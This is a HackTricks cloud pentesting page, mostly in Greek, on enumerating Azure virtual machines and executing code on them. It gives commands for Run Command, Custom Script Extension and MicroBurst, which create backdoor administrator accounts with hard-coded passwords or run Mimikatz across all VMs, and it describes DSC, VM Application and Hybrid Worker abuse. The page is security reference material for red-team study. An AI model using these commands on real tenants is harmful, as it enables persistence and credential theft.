# Az - Virtual Machines & Network

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic information

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Οι εικονικές μηχανές Azure είναι ένας από τους διάφορους τύπους [υπολογιστικών πόρων κατά παραγγελία και κλιμακούμενων](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) που προσφέρει το Azure. Συνήθως, επιλέγετε μια εικονική μηχανή όταν χρειάζεστε περισσότερη έλεγχο πάνω στο υπολογιστικό περιβάλλον από ότι προσφέρουν οι άλλες επιλογές. Αυτό το άρθρο σας παρέχει πληροφορίες σχετικά με το τι θα πρέπει να εξετάσετε πριν δημιουργήσετε μια εικονική μηχανή, πώς να την δημιουργήσετε και πώς να την διαχειριστείτε.

## Azure Network Information

Τα δίκτυα Azure περιέχουν **διαφορετικές οντότητες και τρόπους για να το διαμορφώσετε.** Μπορείτε να βρείτε μια σύντομη **περιγραφή,** **παραδείγματα** και **εντολές αρίθμησης** των διαφορετικών οντοτήτων δικτύου Azure στο:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** προσφέρει μια ασφαλή, πλήρως διαχειριζόμενη λύση πρόσβασης RDP (Remote Desktop Protocol) και SSH (Secure Shell) μέσω SSL μέσω της πύλης Azure. Είναι ενσωματωμένο σε ένα εικονικό δίκτυο Azure, επιτρέποντας τη συνδεσιμότητα RDP και SSH σε VMs χρησιμοποιώντας ιδιωτικές διευθύνσεις IP, αποφεύγοντας την ανάγκη για δημόσιες διευθύνσεις IP. Αυτό το καθιστά μια πιο ασφαλή και βολική εναλλακτική λύση σε παραδοσιακές μεθόδους που περιλαμβάνουν δημόσιες αναθέσεις IP και ρυθμίσεις κανόνων NSG για πρόσβαση σε VM. Οι προγραμματιστές και το προσωπικό IT μπορούν να έχουν ασφαλή πρόσβαση σε VMs από την πύλη Azure χρησιμοποιώντας τους περιηγητές τους, απλοποιώντας τη διαδικασία για περιβάλλοντα ανάπτυξης και δοκιμών.

Για να καταγράψετε όλους τους Azure Bastion Hosts στην συνδρομή σας, μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Καταμέτρηση VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Εκτέλεση εντολών σε μια VM**

### **Σύνδεση AAD σε VM**

Είναι δυνατόν να επιτραπεί η πρόσβαση σε χρήστες που έχουν πιστοποιηθεί μέσω AzureAD. Για παράδειγμα, προσπαθώντας να αποκτήσετε πρόσβαση σε μια **linux VM**: `ssh username@azure-corp.com@1.1.1.1` (είναι σημαντικό να **χρησιμοποιήσετε το email** με το azurecorp που χρησιμοποιήθηκε κατά την προσπάθεια σύνδεσης) μπορεί να λάβετε ένα σφάλμα όπως: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Απλά **ακολουθήστε αυτές τις οδηγίες** πηγαίνοντας στο [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) και υποδεικνύοντας τον κωδικό, χρησιμοποιήστε το email και τον κωδικό πρόσβασης ως διαπιστευτήρια και θα μπορέσετε να συνδεθείτε μέσω SSH (αν αυτός ο χρήστης έχει αρκετές άδειες για να το κάνει: `Virtual Machine Administrator Login` ή `Virtual Machine User Login` ρόλος).

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Εκτέλεση Εξατομικευμένης Επέκτασης Σκριπτ**

Οι επεκτάσεις εικονικών μηχανών (VM) του Azure είναι **μικρές εφαρμογές** που παρέχουν ρυθμίσεις και αυτοματοποίηση **εργασιών** μετά την ανάπτυξη σε **Azure VMs**. Για παράδειγμα, αν μια εικονική μηχανή απαιτεί εγκατάσταση λογισμικού, προστασία από ιούς ή τη δυνατότητα εκτέλεσης ενός σκριπτ μέσα σε αυτήν, μπορείτε να χρησιμοποιήσετε μια επέκταση VM.

Επομένως, αν έχετε πρόσβαση για να το γράψετε, μπορείτε να εκτελέσετε αυθαίρετο κώδικα:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

Το DesiredConfigurationState (DSC) είναι ένα εργαλείο PowerShell παρόμοιο με το Ansible, που χρησιμοποιείται για την εγκατάσταση ενός host μέσω κώδικα. Το DSC ενσωματώνεται με το Azure, επιτρέποντας την ανέβασμα συγκεκριμένων αρχείων διαμόρφωσης. Αυτά τα αρχεία πρέπει να τηρούν μια αυστηρή σύνταξη. Σημαντικό είναι ότι η επέκταση DSC στο Azure μπορεί να εκτελεί εντολές από αρχεία που πληρούν ορισμένα κριτήρια μορφοποίησης, ακόμη και αν η σύνταξη δεν είναι σωστή σύμφωνα με τα πρότυπα DSC, όπως φαίνεται στην παρεχόμενη εικόνα.

Η εκτέλεση αυτών των εντολών διευκολύνεται από τη [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) λειτουργία στο Az PowerShell. Οι απαιτήσεις περιλαμβάνουν ένα **.PS1** αρχείο με μια καθορισμένη λειτουργία και το αρχείο πρέπει να είναι συμπιεσμένο σε ένα **.zip** αρχείο. Ακόμη και αν η σύνταξη δεν είναι ακριβής για το DSC, ο κώδικας θα εκτελείται. Ωστόσο, η επέκταση θα σημειώσει την κατάσταση εκτέλεσης ως "αποτυχία," και καμία έξοδος από την εντολή δεν θα είναι ορατή λόγω της κατάστασης που θα έχει αντικατασταθεί από το μήνυμα αποτυχίας.

### VM Application Definitions

Οι Ορισμοί Εφαρμογών VM επιτρέπουν την επαναλαμβανόμενη ανάπτυξη εκδόσεων εφαρμογών σε ένα Azure VM. Αυτός ο πόρος υποστηρίζει την ανάπτυξη και την ενημέρωση εφαρμογών σε VMs. Για να ρυθμιστεί αυτό, απαιτούνται αρκετά βήματα, που περιλαμβάνουν εντολές όπως **`New-AzGalleryApplication`** και **`New-AzGalleryApplicationVersion`** στο Az PowerShell.

Η εκτέλεση εφαρμογών ή εντολών μέσω αυτής της μεθόδου περιλαμβάνει την **"VMAppExtension,"** η οποία εγκαθίσταται αυτόματα όταν μια εφαρμογή εφαρμόζεται σε ένα VM. Η επέκταση ανακτά το αρχείο από την καθορισμένη URI και το ονομάζει ακριβώς όπως η εφαρμογή, χωρίς επέκταση. Για να εκτελεστεί σωστά το αρχείο, το πεδίο "ManageActions" στην κλήση REST API πρέπει να ρυθμιστεί ώστε να μετονομάσει το αρχείο με την κατάλληλη επέκταση. Η ρύθμιση αυτής της μεθόδου, μόλις ολοκληρωθεί, θα μοιάζει με τη δομή που φαίνεται στην παρεχόμενη εικόνα.

Ωστόσο, αυτή η μέθοδος εκτέλεσης είναι σχετικά αργή, απαιτώντας περίπου 3-4 λεπτά για να εκτελέσει μια εφαρμογή ή εντολή. Τα αρχεία που σχετίζονται με αυτή τη διαδικασία αποθηκεύονται σε συγκεκριμένους καταλόγους (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` για την αντιγραφή της εφαρμογής και `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` για την κατάσταση εκτέλεσης).

Και οι δύο τεχνικές παρέχουν μοναδικούς τρόπους εκτέλεσης εντολών και ανάπτυξης εφαρμογών σε περιβάλλοντα Azure, καθένα με το δικό του σύνολο απαιτήσεων, βημάτων και παραμέτρων.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) είναι μια δυνατότητα στο Azure που επιτρέπει στους Runbooks, που έχουν ρυθμιστεί σε έναν Λογαριασμό Αυτοματοποίησης, να εκτελούνται σε μια Azure Virtual Machine (VM) που είναι μέρος της καθορισμένης HWG. Αυτή η εκτέλεση διευκολύνεται μέσω μιας επέκτασης που εγκαθίσταται στη VM, η οποία αναπτύσσει τον κώδικα Runbook στη VM. Ένας σημαντικός τομέας αυτής της διαδικασίας είναι ότι τα πραγματικά διαπιστευτήρια δεν είναι παράγοντας στην εκτέλεση, καθώς ο κώδικας εκτελείται με ανυψωμένα δικαιώματα, συγκεκριμένα ως **SYSTEM** ή root, όπως απεικονίζεται στην παρεχόμενη εικόνα.

Μια κρίσιμη λεπτομέρεια για όσους χρησιμοποιούν Windows 10 VMs είναι η ανάγκη να καθοριστεί η έκδοση PowerShell για τον Runbook. Πρέπει να ρυθμιστεί ώστε να εκτελείται ως PowerShell Έκδοση 5.1 αντί για 7.1. Αυτή η απαίτηση προέρχεται από το γεγονός ότι το PowerShell 7.1 δεν είναι εγκατεστημένο από προεπιλογή σε αυτές τις VMs, οδηγώντας σε αποτυχία εκτέλεσης του script αν καθοριστεί η έκδοση 7.1.

Αυτή η δυνατότητα του Azure προσφέρει μια ισχυρή μέθοδο για την αυτοματοποίηση και τη διαχείριση εργασιών σε υβριδικά περιβάλλοντα, επιτρέποντας την κεντρική διαχείριση και εκτέλεση εργασιών σε Azure VMs.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
